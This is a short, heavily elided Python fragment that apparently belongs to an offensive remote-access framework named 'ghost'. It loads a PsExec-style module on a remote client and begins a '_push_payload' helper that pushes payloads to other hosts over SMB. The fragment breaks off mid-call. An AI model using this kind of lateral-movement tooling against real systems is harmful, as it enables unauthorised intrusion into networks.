...
from ghost.cli.ghostgen import generate_binary_from_template
...
def serve(
    ...
    if host is None:
        ...
        module.client.load_package('ghostutils.psexec')
        ghost_smb_exec = module.client.remote(
            'ghostutils.psexec', 'ghost_smb_exec', False
        )

        def _push_payload(payload, timeout=90, log_cb=None):
            return ghost_smb_exec(
